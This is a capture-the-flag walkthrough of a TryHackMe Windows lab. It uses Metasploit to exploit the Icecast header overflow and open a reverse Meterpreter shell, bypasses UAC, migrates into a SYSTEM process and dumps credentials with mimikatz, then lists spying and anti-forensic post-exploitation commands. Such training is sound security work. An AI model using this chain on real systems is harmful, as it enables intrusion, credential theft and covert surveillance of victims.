# TryHackMe ICE Write-up

A walkthrough of a Windows-based TryHackMeCTF.
https://tryhackme.com/room/ice

## Recon

### Nmap scan

- Windows machine
- Multiple open services
- SMB open
- Icecast media streaming server open
- Quite a few open RPC services
- A HTTP API
- Remote desktop (read as `ms-wbt-server`)
- Hostname enumerated as `DARK-PC` from SMB.

```shell
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-30 20:45 BST
Nmap scan report for 10.10.70.52
Host is up (0.021s latency).
Not shown: 988 closed ports
PORT      STATE SERVICE            VERSION
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ssl/ms-wbt-server?
|_ssl-date: 2020-09-30T19:46:14+00:00; 0s from scanner time.
5357/tcp  open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Service Unavailable
8000/tcp  open  http               Icecast streaming media server
|_http-title: Site doesn\'t have a title (text/html).
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49158/tcp open  msrpc              Microsoft Windows RPC
49159/tcp open  msrpc              Microsoft Windows RPC
49160/tcp open  msrpc              Microsoft Windows RPC
Service Info: Host: DARK-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1h15m00s, deviation: 2h30m00s, median: 0s
|_nbstat: NetBIOS name: DARK-PC, NetBIOS user: <unknown>, NetBIOS MAC: 02:9d:da:4c:eb:f7 (unknown)
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: Dark-PC
|   NetBIOS computer name: DARK-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2020-09-30T14:46:09-05:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-09-30T19:46:08
|_  start_date: 2020-09-30T19:43:59

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 126.36 seconds

```

## Gaining Access

### Finding an Icecast vuln

We can find a vuln on CVEDetails.

There isn't much in terms of versioning that the nmap scan has given us. 
So we'll have to guess at the CVE that TryHackMe is referring to.

Order results by vulns criticality over 7.
There are no explicitally matching _types_ of vulns.
But, with some common sense we can determine the bug we're looking for is:
`execute code overflow`

Of which, CVE `CVE-2004-1561` is one of the vuln opportunities.

### Metasploit

For this CTF, we're asked to use metasploit.

```shell
msf5 > search icecast

Matching Modules
================

   #  Name                                 Disclosure Date  Rank   Check  Description
   -  ----                                 ---------------  ----   -----  -----------
   0  exploit/windows/http/icecast_header  2004-09-28       great  No     Icecast Header Overwrite
```

We're potentially lucky in that we've only got one option.
Lets hope it works. And `use 0`, we'll want to set up as appropriate too.

```shell
msf5 exploit(windows/http/icecast_header) > options

Module options (exploit/windows/http/icecast_header):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS  10.10.70.52      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT   8000             yes       The target port (TCP)

Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     tun0             yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf5 exploit(windows/http/icecast_header) > run

[*] Started reverse TCP handler on 10.11.8.219:4444
[*] Meterpreter session 1 opened (10.11.8.219:4444 -> 10.10.70.52:49261) at 2020-09-30 22:04:29 +0100

meterpreter>
```

Great, we have a meterpreter session after exploiting the Icecast service.

## Escalation

Now that we've got a `meterpreter` shell, we can start enumerating the system.

We can check what processes are running, and who is running them with `ps`.

```shell
meterpreter > ps

Process List
============

 PID   PPID  Name                  Arch  Session  User          Path
 ---   ----  ----                  ----  -------  ----          ----
 0     0     [System Process]
 4     0     System
 416   4     smss.exe
 500   692   svchost.exe
 544   536   csrss.exe
 588   692   svchost.exe
 592   536   wininit.exe
 604   584   csrss.exe
 652   584   winlogon.exe
 692   592   services.exe
 700   592   lsass.exe
 708   592   lsm.exe
 816   692   svchost.exe
 884   692   svchost.exe
 932   692   svchost.exe
 1056  692   svchost.exe
 1140  692   svchost.exe
 1260  692   spoolsv.exe
 1292  692   sppsvc.exe
 1324  692   svchost.exe
 1408  692   taskhost.exe          x64   1        Dark-PC\Dark  C:\Windows\System32\taskhost.exe
 1516  500   dwm.exe               x64   1        Dark-PC\Dark  C:\Windows\System32\dwm.exe
 1528  1496  explorer.exe          x64   1        Dark-PC\Dark  C:\Windows\explorer.exe
 1568  692   amazon-ssm-agent.exe
 1704  692   LiteAgent.exe
 1744  692   svchost.exe
 1800  816   WmiPrvSE.exe
 1884  692   Ec2Config.exe
 2076  692   svchost.exe
 2204  692   vds.exe
 2260  1528  Icecast2.exe          x86   1        Dark-PC\Dark  C:\Program Files (x86)\Icecast2 Win32\Icecast2.exe
 2508  692   SearchIndexer.exe
 3024  692   TrustedInstaller.exe
 4004  816   slui.exe              x64   1        Dark-PC\Dark  C:\Windows\System32\slui.exe

meterpreter >
```

We can enumerate some system info with `sysinfo`.

```shell
meterpreter> sysinfo
Computer        : DARK-PC
OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/windows
meterpreter >
```

OS is Windows 7, build `7601`. On `x64` architecture.

We can further enumerate with a some `post` exploitations on our meterpreter shell.
Lets use `post/multi/recon/local_exploit_suggester`.

There're a lot of exploits being tested.
Module appears to hang. But numerous vulns are found.

```shell
reter > run post/multi/recon/local_exploit_suggester

[*] 10.10.70.52 - Collecting local exploits for x86/windows...
[*] 10.10.70.52 - 34 exploit checks are being tried...
[+] 10.10.70.52 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
nil versions are discouraged and will be deprecated in Rubygems 4
[+] 10.10.70.52 - exploit/windows/local/ikeext_service: The target appears to be vulnerable.
[+] 10.10.70.52 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
[+] 10.10.70.52 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
[+] 10.10.70.52 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.70.52 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.70.52 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.70.52 - exploit/windows/local/ntusermndragover: The target appears to be vulnerable.
[+] 10.10.70.52 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
meterpreter >
```
Background the meterpreter session with `bg`, then use the `bypassuac_eventvwr` exploit.

```shell
meterpreter > bg
Backgrounding session 1...

msf5 exploit(windows/http/icecast_header) > use exploit/windows/local/bypassuac_eventvwr
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf5 exploit(windows/local/bypassuac_eventvwr) > set session 1
session => 1
msf5 exploit(windows/local/bypassuac_eventvwr) > show options

Module options (exploit/windows/local/bypassuac_eventvwr):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION  1                yes       The session to run this module on.


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.0.2.15        yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows x86


msf5 exploit(windows/local/bypassuac_eventvwr) > set lhost tun0
lhost => tun0
msf5 exploit(windows/local/bypassuac_eventvwr) > run

[*] Started reverse TCP handler on 10.11.8.219:4444
[*] UAC is Enabled, checking level...
[+] Part of Administrators group! Continuing...
[+] UAC is set to Default
[+] BypassUAC can bypass this setting, continuing...
[*] Configuring payload and stager registry keys ...
[*] Executing payload: C:\Windows\SysWOW64\eventvwr.exe
[+] eventvwr.exe executed successfully, waiting 10 seconds for the payload to execute.
[*] Sending stage (176195 bytes) to 10.10.70.52
[*] Meterpreter session 2 opened (10.11.8.219:4444 -> 10.10.70.52:49298) at 2020-09-30 22:38:44 +0100
[*] Cleaning up registry keys ...

meterpreter > getprives
[-] Unknown command: getprives.
meterpreter > getprives
[-] Unknown command: getprives.
meterpreter > getprivs

Enabled Process Privileges
==========================

Name
----
SeBackupPrivilege
SeChangeNotifyPrivilege
SeCreateGlobalPrivilege
SeCreatePagefilePrivilege
SeCreateSymbolicLinkPrivilege
SeDebugPrivilege
SeImpersonatePrivilege
SeIncreaseBasePriorityPrivilege
SeIncreaseQuotaPrivilege
SeIncreaseWorkingSetPrivilege
SeLoadDriverPrivilege
SeManageVolumePrivilege
SeProfileSingleProcessPrivilege
SeRemoteShutdownPrivilege
SeRestorePrivilege
SeSecurityPrivilege
SeShutdownPrivilege
SeSystemEnvironmentPrivilege
SeSystemProfilePrivilege
SeSystemtimePrivilege
SeTakeOwnershipPrivilege
SeTimeZonePrivilege
SeUndockPrivilege
```

We can now run `getprivs` and enumerate privileges.

## Looting

We can use `mimikatz` to loot the system. 
After running `ps` previously, we saw various processes.
We need to get into a process that's ran by NT AUTHORITY\SYSTEM.

To interact with lsass we need to some some DLL injection.
Can inject into print spool service.

```shell
1260  692   spoolsv.exe
```

To do this we can run `migrate` in to the meterpreter shell.
This can be done with `-N PROCESSNAME` flag but I prefer to use process id.

```shell
meterpreter > migrate 1260
[*] Migrating from 3876 to 1260...
[*] Migration completed successfully.
meterpreter >
```

After migrating, check the current user that we're using.
We should now _be_ the process owner.

```shell
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter >
```

We essentially have _root_ access now.
So, lets `load kiwi` aka. mikikatz.

```shell
meterpreter> load kiwi
Loading extension kiwi...
  .#####.   mimikatz 2.2.0 20191125 (x64/windows)
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/

Success.
meterpreter >
```

When we run the `help` command--after loading kiwi--we'll see extra commands; commands that're related to kiwi/kerberous/mimikatz.

```shell
Kiwi Commands
=============

    Command                Description
    -------                -----------
    creds_all              Retrieve all credentials (parsed)
    creds_kerberos         Retrieve Kerberos creds (parsed)
    creds_msv              Retrieve LM/NTLM creds (parsed)
    creds_ssp              Retrieve SSP creds
    creds_tspkg            Retrieve TsPkg creds (parsed)
    creds_wdigest          Retrieve WDigest creds (parsed)
    dcsync                 Retrieve user account information via DCSync (unparsed)
    dcsync_ntlm            Retrieve user account NTLM hash, SID and RID via DCSync
    golden_ticket_create   Create a golden kerberos ticket
    kerberos_ticket_list   List all kerberos tickets (unparsed)
    kerberos_ticket_purge  Purge any in-use kerberos tickets
    kerberos_ticket_use    Use a kerberos ticket
    kiwi_cmd               Execute an arbitary mimikatz command (unparsed)
    lsa_dump_sam           Dump LSA SAM (unparsed)
    lsa_dump_secrets       Dump LSA secrets (unparsed)
    password_change        Change the password/hash of a user
    wifi_list              List wifi profiles/creds for the current user
    wifi_list_shared       List shared wifi profiles/creds (requires SYSTEM)
```

This is where the fun comes in.
We can loot all the things.
`creds_all` gets all the creds. Who'd've guessed.

```shell
meterpreter > creds_all
[+] Running as SYSTEM
[*] Retrieving all credentials
msv credentials
===============

Username  Domain   LM                                NTLM                              SHA1
--------  ------   --                                ----                              ----
Dark      Dark-PC  e52cac67419a9a22ecb08369099ed302  7c4fe5eada682714a036e39378362bab  0d082c4b4f2aeafb67fd0ea568a997e9d3ebc0eb

wdigest credentials
===================

Username  Domain     Password
--------  ------     --------
(null)    (null)     (null)
DARK-PC$  WORKGROUP  (null)
Dark      Dark-PC    Password01!

tspkg credentials
=================

Username  Domain   Password
--------  ------   --------
Dark      Dark-PC  Password01!

kerberos credentials
====================

Username  Domain     Password
--------  ------     --------
(null)    (null)     (null)
Dark      Dark-PC    Password01!
dark-pc$  WORKGROUP  (null)


meterpreter > Interrupt: use the 'exit' command to quit
meterpreter >
```

This render's `Dark`'s password; `Password01!`.
Mimikatz does this in a really interesting way.

Even though `Dark` isn't actually logged in. 
There's a process running _as_ `Dark`.
And therefore, Mimikatz can pull `Dark`'s password out of memory!.

## Post-exploitation

We saw the post-explotation commands in the previous section. 
Lets dive into some more..

- `hashdump`: Dumps all victim's hashes
- `screenshare`: Allows attacker to watch screen in realtime
- `record_mic`: Records victim's microphone 
- `timestomp`: Scrambles modified files' timestamps.
- `golden_ticket_create`: (Mimikatz) allows us to generate a golden ticket for authenticating anywhere.

We could also RDP into the system; firstly, enabling RDP on a system that has it disabled.

```shell
meterpreter> run post/windows/manage/enabled_rdp
```


